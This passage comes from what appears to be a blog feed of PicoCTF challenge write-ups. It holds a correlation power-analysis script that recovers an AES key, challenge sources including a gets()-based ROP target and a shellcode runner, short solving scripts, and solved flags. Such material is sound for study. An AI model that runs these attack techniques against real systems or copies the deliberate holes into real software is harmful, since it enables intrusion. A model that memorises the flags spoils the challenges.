0x62, 0x91, 0x95, 0xE4, 0x79], [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08], [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A], [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E], [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF], [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16] ] def data_preprocess(json_data): pt_col = [] # ct_col = [] trace_col = [] for bytes in range(16): tmp_pt_col = [] # tmp_ct_col = [] for trace_idx in range(len(json_data)): tmp_pt_col.append(json_data[trace_idx]['pt'][bytes]) # tmp_ct_col.append(json_data[trace_idx]['ct'][bytes]) pt_col.append(tmp_pt_col) # ct_col.append(tmp_ct_col) for point in range(300, 400):#len(json_data[0]['pm']) tmp_trace_col = [] for trace_idx in range(len(json_data)): tmp_trace_col.append(json_data[trace_idx]['pm'][point]) trace_col.append(tmp_trace_col) return pt_col, trace_col def sbox_preprocess(pt_col): sbox_result_tmp = [] for sbox_key in range(256): # 總共有256個sbox key tmp = [] for trace in range(len(pt_col)): # 有50個trace tmp.append(pt_col[trace] ^ sbox_key) sbox_result_tmp.append(tmp) return sbox_result_tmp def choose_sbox(sbox_result_tmp): sbox_result = copy.deepcopy(sbox_result_tmp) for sbox_key in range(256): for trace in range(50): hex_value = '{0:0>2x}'.format(sbox_result_tmp[sbox_key][trace]) x, y = hex_value[0], hex_value[1] sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)] return sbox_result def cal_hamming_weight(sbox_result_col): hw_model = copy.deepcopy(sbox_result_col) for i in range(len(sbox_result_col)): # 256 for j in range(len(sbox_result_col[i])): # 50 hw_model[i][j] = bin(sbox_result_col[i][j]).count('1') return hw_model def cal_correlation(hw_model_col_result, trace_col): correlation_result = [] for i in trange(len(hw_model_col_result)):#(ascii_letters + digits).encode(): for j in range(biggest_length):#len(trace_col) # correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1]) # correlation_result.append(pearsonr(hw_model_col_result[i], trace_col[j])[0]) correlation_result.append(run_pearson_correlation(hw_model_col_result[i], trace_col[j])) return correlation_result def run_pearson_correlation(x, y): mean_x = np.mean(x) mean_y = np.mean(y) covariance = np.sum((x - mean_x) * (y - mean_y)) std_dev_x = np.sqrt(np.sum((x - mean_x)**2)) std_dev_y = np.sqrt(np.sum((y - mean_y)**2)) correlation = covariance / (std_dev_x * std_dev_y) return correlation def display_pt(offset:int, data_offset = (0, len(j[0]["pm"]))): plt.plot(range(data_offset[0], data_offset[1]), j[offset]["pm"][data_offset[0]:data_offset[1]]) plt.savefig(fname="./PicoCTF/Crypto/PowerAnalysis- Part 1/pt_" + str(offset) + ".jpg") plt.clf() # display_pt(1, (0, 700)) # display_pt(1) pt_col, trace_col = data_preprocess(j) flag = '' biggest_length = 100#len(trace_col) for idx in trange(16): sbox_preprocess_result = sbox_preprocess(pt_col[idx]) choose_sbox_result = choose_sbox(sbox_preprocess_result) hw_model_col_result = cal_hamming_weight(choose_sbox_result) correlation_result = cal_correlation(hw_model_col_result, trace_col) key_idx = correlation_result.index(max(correlation_result)) # flag += (ascii_letters + digits)[key_idx // biggest_length] from Crypto.Util.number import long_to_bytes flag += long_to_bytes(key_idx // biggest_length).hex() print('The key of AES is: ' + flag ) Flag: picoCTF{4999139026d84bf20427eb48d4edec53}</description></item><item><title>PicoCTF - Powershelly</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---powershelly/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---powershelly/index.html</guid><description>PicoCTF - Powershelly Background Powershell 命令提示字元比較 What is ‘@{}’ meaning in PowerShell What does @() mean in Powershell? [Python] 學習使用集合 (Set)
Source code :::spoiler Source Code
$input = ".\input.txt" $out = Get-Content -Path $input $enc = [System.IO.File]::ReadAllBytes("$input") $encoding = [system.Text.Encoding]::UTF8 $total = 264 $t = ($total + 1) * 5 #1325 $numLength = ($total * 30 ) + $t # 9245 if ($out.Length -gt 5 -or $enc.count -ne $numLength) { Write-Output "Wrong format 5" Exit } else { for($i=0; $i -lt $enc.count ; $i++) { if (($enc[$i] -ne 49) -and ($enc[$i] -ne 48) -and ($enc[$i] -ne 10) -and ($enc[$i] -ne 13) -and ($enc[$i] -ne 32)) { Write-Output "Wrong format 1/0/" Exit } } } $blocks = @{} for ($i=0; $i -lt $out.Length ; $i++) { $r = $out[$i].Split(" ") if ($i -gt 0) { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output "Wrong Format 6" $r[$j].Length Exit } $blocks[$j] += $r[$j] } } else { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output "Wrong Format 6" $r[$j].Length Exit } $blocks[$j] = @() $blocks[$j] += $r[$j] } } } function Exit { exit } function Random-Gen { $list1 = @() for ($i=1; $i -lt ($blocks.count + 1); $i++) { $y = ((($i * 327) % 681 ) + 344) % 313 $list1 += $y } return $list1 } function Scramble { param ( $block, $seed ) $raw = [system.String]::Join("", $block) $bm = "10 " * $raw.Length $bm = $bm.Split(" ") for ($i=0; $i -lt $raw.Length ; $i++) { $y = ($i * $seed) % $raw.Length $n = $bm[$y] while ($n -ne "10") { $y = ($y + 1) % $raw.Length $n = $bm[$y] } if ($raw[$i] -eq "1" ) { $n = "11" } else { $n = "00" } $bm[$y] = $n } $raw2 = [system.String]::Join("", $bm) $b = [convert]::ToInt64($raw2,2) return $b } $result = 0 $seeds = @() for ($i=1; $i -lt ($blocks.count +1); $i++) { $seeds += ($i * 127) % 500 } $randoms = Random-Gen $output_file = @() for ($i=0; $i -lt $blocks.count ; $i++) { $fun = Scramble -block $blocks[$i] -seed $seeds[$i] if($i -eq 263) { Write-Output $seeds[$i] Write-Output $randoms[$i] Write-Output $fun } $result = $fun -bxor $result -bxor $randoms[$i] $output_file += $result } Add-Content -Path output_test.txt -Value $output_file :::</description></item><item><title>PicoCTF - PW Crack 4</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---pw-crack-4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---pw-crack-4/index.html</guid><description>PicoCTF - PW Crack 4 tags: PicoCTF CTF General Skills Challenge: PW Crack 4
Source code :::spoiler source code
import hashlib ### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ######################## def str_xor(secret, key): #extend key to secret length new_key = key i = 0 while len(new_key) &lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)]) ############################################################################### flag_enc = open('level4.flag.txt.enc', 'rb').read() correct_pw_hash = open('level4.hash.bin', 'rb').read() def hash_pw(pw_str): pw_bytes = bytearray() pw_bytes.extend(pw_str.encode()) m = hashlib.md5() m.update(pw_bytes) return m.digest() def level_4_pw_check(): user_pw = input("Please enter correct password for flag: ") user_pw_hash = hash_pw(user_pw) if( user_pw_hash == correct_pw_hash ): print("Welcome back... your flag, user:") decryption = str_xor(flag_enc.decode(), user_pw) print(decryption) return print("That password is incorrect") level_4_pw_check() # The strings below are 100 possibilities for the correct password. # (Only 1 is correct) pos_pw_list = ["6288", "6152", "4c7a", "b722", "9a6e", "6717", "4389", "1a28", "37ac", "de4f", "eb28", "351b", "3d58", "948b", "231b", "973a", "a087", "384a", "6d3c", "9065", "725c", "fd60", "4d4f", "6a60", "7213", "93e6", "8c54", "537d", "a1da", "c718", "9de8", "ebe3", "f1c5", "a0bf", "ccab", "4938", "8f97", "3327", "8029", "41f2", "a04f", "c7f9", "b453", "90a5", "25dc", "26b0", "cb42", "de89", "2451", "1dd3", "7f2c", "8919", "f3a9", "b88f", "eaa8", "776a", "6236", "98f5", "492b", "507d", "18e8", "cfb5", "76fd", "6017", "30de", "bbae", "354e", "4013", "3153", "e9cc", "cba9", "25ea", "c06c", "a166", "faf1", "2264", "2179", "cf30", "4b47", "3446", "b213", "88a3", "6253", "db88", "c38c", "a48c", "3e4f", "7208", "9dcb", "fc77", "e2cf", "8552", "f6f8", "7079", "42ef", "391e", "8a6d", "2154", "d964", "49ec"] :::</description></item><item><title>PicoCTF - ropfu</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---ropfu/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---ropfu/index.html</guid><description>PicoCTF - ropfu Background ROP Chain x86 Calling Convention: Linux System Call Table
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #define BUFSIZE 16 void vuln() { char buf[16]; printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n"); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } :::</description></item><item><title>PicoCTF - RPS</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---rps/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---rps/index.html</guid><description>PicoCTF - RPS Background strstr() in C/C++
In C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\0’), but function stops there. Syntax:
char *strstr (const char *s1, const char *s2); Parameters: s1: This is the main string to be examined. s2: This is the sub-string to be searched in s1 string. Return Value: This function returns a pointer points to the first character of the found s2 in s1 otherwise a null pointer if s2 is not present in s1. If s2 points to an empty string, s1 is returned.</description></item><item><title>PicoCTF - SaaS</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---saas/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---saas/index.html</guid><description>PicoCTF - SaaS Background seccomp-tool
Source code :::spoiler Source Code
#include &lt;errno.h> #include &lt;error.h> #include &lt;fcntl.h> #include &lt;seccomp.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;sys/mman.h> #include &lt;sys/syscall.h> #include &lt;unistd.h> #define SIZE 0x100 // http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;arch=x86-64&amp;as_format=inline#assembly #define HEADER "\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff" #define FLAG_SIZE 64 char flag[FLAG_SIZE]; void load_flag() { int fd; if ((fd = open("flag.txt", O_RDONLY)) == -1) error(EXIT_FAILURE, errno, "open flag"); if (read(fd, flag, FLAG_SIZE) == -1) error(EXIT_FAILURE, errno, "read flag"); if (close(fd) == -1) error(EXIT_FAILURE, errno, "close flag"); } void setup() { scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_KILL); int ret = 0; if (ctx != NULL) { ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1, SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO)); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); ret |= seccomp_load(ctx); } seccomp_release(ctx); if (ctx == NULL || ret) error(EXIT_FAILURE, 0, "seccomp"); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); load_flag(); puts("Welcome to Shellcode as a Service!"); void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); memcpy(addr, HEADER, sizeof(HEADER)); read(0, addr + sizeof(HEADER) - 1, SIZE); setup(); goto *addr; } :::</description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html</guid><description>PicoCTF - Scavenger Hunt tags: PicoCTF CTF Web Challenge: Scavenger Hunt
Background .htaccess 使用技巧彙整
.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。 概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。 .htaccess 詳解
Exploit - Insp3ct0r + htaccess + DS_Store HTML + CSS +JS These files keeps one fragment flag each. Especially js file’s hint: /* How can I keep Google from indexing my website? */ Apache server $\to$ .htaccess file</description></item><item><title>PicoCTF - scrambled-bytes</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/index.html</guid><description>PicoCTF - scrambled-bytes Background 盤點一款 Python 發包收包利器 - scapy
只發不收 send(pkt, inter=0, loop=0, count=1, iface=N) pkt:數據包 inter：發包間隔時間 count：發包數量 iface：網卡接口名稱 send()，在第三層發包，沒有接收功能；send(IP(dst="www.baidu.com",ttl=2)/ICMP()) sendp()，在第二層發包，沒有接收功能。sr(Ether()/IP(dst="www.baidu.com")) time-時間的訪問和轉換 python 的pyshark庫如何使用 PyShark入門(2)：FileCapture和LiveCapture模塊
Source code :::spoiler Source Code
#!/usr/bin/env python3 import argparse from progress.bar import IncrementalBar from scapy.all import * import ipaddress import random from time import time def check_ip(ip): try: return ipaddress.ip_address(ip) except: raise argparse.ArgumentTypeError(f'{ip} is an invalid address') def check_port(port): try: port = int(port) if port &lt; 1 or port > 65535: raise ValueError return port except: raise argparse.ArgumentTypeError(f'{port} is an invalid port') def main(args): with open(args.input, 'rb') as f: payload = bytearray(f.read()) random.seed(int(time())) random.shuffle(payload) with IncrementalBar('Sending', max=len(payload)) as bar: for b in payload: send( IP(dst=str(args.destination)) / UDP(sport=random.randrange(65536), dport=args.port) / Raw(load=bytes([b^random.randrange(256)])), verbose=False) bar.next() if __name__=='__main__': parser = argparse.ArgumentParser() parser.add_argument('destination', help='destination IP address', type=check_ip) parser.add_argument('port', help='destination port number', type=check_port) parser.add_argument('input', help='input file') main(parser.parse_args()) :::</description></item><item><title>PicoCTF - Scrambled: RSA</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/index.html</guid><description>PicoCTF - Scrambled: RSA tags: PicoCTF CTF Crypto Hint Look at the ciphertext, anything fishy, maybe a little bit long? What happens if you encrypt the same input multiple times? Is RSA deterministic, why would outputs vary? Recon - 通靈 這一題也是頗有趣但要通靈，可以先亂Try
$ nc mercury.picoctf.net 61477 flag = ... I will encrypt whatever you give me: b Here you go: 26990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237 I will encrypt whatever you give me: ba Here you go: 2699004973557840903068237896554908567634409148106041965530669507822650040067943518091441485384345651795926993802543646237181316747733988751129332049819566771732087961765397407420468704229488779578412271162151048595114284277095132529867781110270620027540689911789424114557560291245144389268725220840201190423748281433709412944662646587136176334777506529508638551296181668932027523016538393747587852449462326357575277427356480410273494280971757044562513629423400967407332448126388859817313684399195291279961899276921240210270110225654310423792352532266414306766344869066386142998118001891330035563388790707576505068944 I will encrypt whatever you give me: bac Here you go: 482814337094129446626465871361763347775065295086385512961816689320275230165383937475878524494623263575752774273564804102734942809717570445625136294234009674073324481263888598173136843991952912799618992769212402102701102256543104237923525322664143067663448690663861429981180018913300355633887907075765050689449619429085627210113794723864117161956939961066630142420889676674025917593454737310140819887001206562193281145515990410131903949359211712425034234736366286462137700473579439657314154736719868903719111785858132034797052503447042089004862886989401543635700329455353580959453911569277021402998961166474045310601826990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237 ... 一開始加密的b是269900...904237，第二個加密的ba是26990...5068944，但如果仔細看其實第一個加密的密文其實也存在其中，他其實是269900...904237+482814...5068944，可以加密第三個bac試看看，也會發現是482814...5068944+961942...3106018+269900...904237 所以我們可以再往這個方向測試一下，我們知道一開始的flag一定是picoCTF{，我們加密p會發現密文其實存在原始的flag密文當中，因此我們可以寫一個腳本，像上一題一樣暴力破解，如果加密的密文有存在原本的flag ciphertext中的話，就代表我們猜對了，反之就繼續找</description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/index.html</guid><description>PicoCTF - Secrets tags: PicoCTF CTF Web Recon Description: We have several pages hidden. Can you find the one with the flag? Hint: folders folders folders 這一題也是蠻有趣的
Exploit - 通靈 首先看一下網頁的source code，沒什麼特別的地方，但有看到secret/assets/index.css，所以有一個route是secrets，試看看有甚麼東西 發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了 Payload: view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/ Flag: picoCTF{succ3ss_@h3n1c@10n_790d2615}
Reference secrets | picoCTF 2022</description></item><item><title>PicoCTF - seed-sPRiNG</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---seed-spring/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---seed-spring/index.html</guid><description>PicoCTF - seed-sPRiNG Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int guess_height; // [esp+0h] [ebp-18h] BYREF int ans; // [esp+4h] [ebp-14h] unsigned int seed; // [esp+8h] [ebp-10h] int i; // [esp+Ch] [ebp-Ch] int *p_argc; // [esp+10h] [ebp-8h] p_argc = &amp;argc; puts(&amp;unk_A50); puts(&amp;unk_A50); puts(" "); puts(" # mmmmm mmmmm \" mm m mmm "); puts(" mmm mmm mmm mmm# mmm # \"# # \"# mmm #\"m # m\" \""); puts(" # \" #\" # #\" # #\" \"# # \" #mmm#\" #mmmm\" # # #m # # mm"); puts(" \"\"\"m #\"\"\"\" #\"\"\"\" # # \"\"\"m # # \"m # # # # # #"); puts(" \"mmm\" \"#mm\" \"#mm\" \"#m## \"mmm\" # # \" mm#mm # ## \"mmm\""); puts(" "); puts(&amp;unk_A50); puts(&amp;unk_A50); puts("Welcome! The game is easy: you jump on a sPRiNG."); puts("How high will you fly?"); puts(&amp;unk_A50); fflush(stdout); seed = time(0); srand(seed); for ( i = 1; i &lt;= 30; ++i ) { printf("LEVEL (%d/30)\n", i); puts(&amp;unk_A50); LOBYTE(ans) = rand() &amp; 0xF; ans = ans; printf("Guess the height: "); fflush(stdout); __isoc99_scanf("%d", &amp;guess_height); fflush(stdin); if ( ans != guess_height ) { puts("WRONG! Sorry, better luck next time!"); fflush(stdout); exit(-1); } } puts("Congratulation! You've won! Here is your flag:\n"); fflush(stdout); get_flag(); fflush(stdout); return 0; } :::</description></item><item><title>PicoCTF - Sequences</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---sequences/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---sequences/index.html</guid><description>PicoCTF - Sequences Source code :::spoiler Source Code
import math import hashlib import sys from tqdm import tqdm import functools ITERS = int(2e7) VERIF_KEY = "96cc5f3b460732b442814fd33cf8537c" ENCRYPTED_FLAG = bytes.fromhex("42cbbce1487b443de1acf4834baed794f4bbd0dfe2d6046e248ff7962b") # This will overflow the stack, it will need to be significantly optimized in order to get the answer :) @functools.cache def m_func(i): if i == 0: return 1 if i == 1: return 2 if i == 2: return 3 if i == 3: return 4 return 55692*m_func(i-4) - 9549*m_func(i-3) + 301*m_func(i-2) + 21*m_func(i-1) # Decrypt the flag def decrypt_flag(sol): sol = sol % (10**10000) sol = str(sol) sol_md5 = hashlib.md5(sol.encode()).hexdigest() if sol_md5 != VERIF_KEY: print("Incorrect solution") sys.exit(1) key = hashlib.sha256(sol.encode()).digest() flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode() print(flag) if __name__ == "__main__": sol = m_func(ITERS) decrypt_flag(sol) :::</description></item><item><title>PicoCTF - shark on wire 1</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/index.html</guid><description>PicoCTF - shark on wire 1 tags: PicoCTF CTF Misc Challenge: shark on wire 1
Exploit - Analyze UDP stream It transfer the single character by UDP protocol. Follow the UDP stream and you’ll get the flag</description></item><item><title>PicoCTF - shark on wire 2</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/index.html</guid><description>PicoCTF - shark on wire 2 Recon 這一提出的很硬要，誰知道會把flag藏在這種地方，也沒有任何的提示，如果不是看1根本不知道這題要表達甚麼，也可能是我太蔡
Simple Recon 首先做一些基本的recon，諸如dump files/string search/follow tcp or udp之類的，會發現UDP packets會有一些訊息出現，其中出現Start和一些a/b最後接著end Set filter as udp.port==22 會發現其中所有的len都一樣，就只有source port不一樣，同樣都是5xxx開頭，而後三位數就是flag Extract Flag 所以只要把所有的port擷取出來拚在一起，就可以拿到flag了 Exploit import pyshark capture = pyshark.FileCapture('./PicoCTF/Misc/shark on wire 2/capture.pcap', display_filter='udp.port == 22') data = [] for pkt in capture: if pkt.udp.port != '5000': data.append(chr(int(pkt.udp.port[1:]))) print("".join(data)) Flag: picoCTF{p1LLf3r3d_data_v1a_st3g0}</description></item><item><title>PicoCTF - SideChannel</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---sidechannel/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---sidechannel/index.html</guid><description>PicoCTF - SideChannel Description There’s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you’ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.
Hint 1: Read about “timing-based side-channel attacks.” Hint 2: Attempting to reverse-engineer or exploit the binary won’t help you, you can figure out the PIN just by interacting with it and measuring certain properties about it. Hint 3: Don’t run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.</description></item><item><title>PicoCTF - Sleuthkit Intro</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/index.html</guid><description>PicoCTF - Sleuthkit Intro tags: PicoCTF CTF Misc Challenge: Sleuthkit Intro
Description Download the disk image and use mmls on it to find the size of the Linux partition. Connect to the remote checker service to check your answer and get the flag. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.
Download disk image Access checker program: nc saturn.picoctf.net 52279 最新kali之mmls</description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html</guid><description>PicoCTF - Some Assembly Required 1 tags: PicoCTF CTF Web Challenge: Some Assembly Required 1
Background 了解 WebAssembly 的基礎使用方法
Source code - After Beautify :::spoiler source code
const strings = ['value', '2wfTpTR', 'instantiate', '275341bEPcme', 'innerHTML', '1195047NznhZg', '1qfevql', 'input', '1699808QuoWhA', 'Correct!', 'check_flag', 'Incorrect!', './JIFxzHyW8W', '23SMpAuA', '802698XOMSrr', 'charCodeAt', '474547vVoGDO', 'getElementById', 'instance', 'copy_char', '43591XxcWUl', '504454llVtzW', 'arrayBuffer', '2NIQmVj', 'result']; const search_string1 = function(id1, _0x53c021) { id1 = id1 - 470; let strings6f = strings[id1]; return strings6f; }; (function(id1, id2) { const search_string = search_string1; while (!![]) { try { const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5)); if (secret_key === id2) break; else id1['push'](id1['shift']()); } catch (_0x41d31a) { id1['push'](id1['shift']()); } } }(strings, 627907)); let exports; (async () => { const search_string = search_string1; let _0x5f0229 = await fetch(search_string(489)), _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()), _0x1f8628 = _0x1d99e9[search_string(470)]; exports = _0x1f8628['exports']; })(); function onButtonPress() { const search_string = search_string1; let input_value = document['getElementById'](search_string(484))[search_string(477)]; // document['getElementById'](input)[value] for (let i = 0; i &lt; input_value['length']; i++) { exports[search_string(471)](input_value[search_string(492)](i), i); } exports['copy_char'](0, input_value['length']), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8); } :::</description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html</guid><description>PicoCTF - Some Assembly Required 2 tags: PicoCTF CTF Web Background Source code :::spoiler source
